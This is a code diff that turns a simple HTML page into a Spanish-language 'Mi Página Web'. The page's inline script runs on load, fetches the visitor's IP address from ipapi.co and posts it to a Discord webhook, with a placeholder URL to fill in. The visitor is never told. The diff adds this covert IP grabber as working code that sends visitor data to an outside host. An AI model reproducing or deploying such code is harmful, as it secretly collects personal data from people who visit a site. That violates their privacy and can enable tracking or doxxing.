@@ -1,13 +1,31 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Document</title>
-    <link rel="stylesheet" href="styles.css">
-    <script defer src="app.js"></script>
+    <title>Mi Página Web</title>
 </head>
 <body>
-    <h1>Hola broder</h1>
+    <script>
+        // Obtener la dirección IP del visitante
+        fetch('https://ipapi.co/json/')
+            .then(response => response.json())
+            .then(data => {
+                const ipAddress = data.ip;
+
+                // Crear un objeto con los datos que deseas enviar a Discord
+                const message = {
+                    content: `La IP del visitante es: ${ipAddress}`,
+                };
+
+                // Enviar la información a la webhook de Discord
+                fetch('URL_DE_TU_WEBHOOK_DISCORD', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(message),
+                });
+            })
+            .catch(error => console.error(error));
+    </script>
 </body>
 </html>
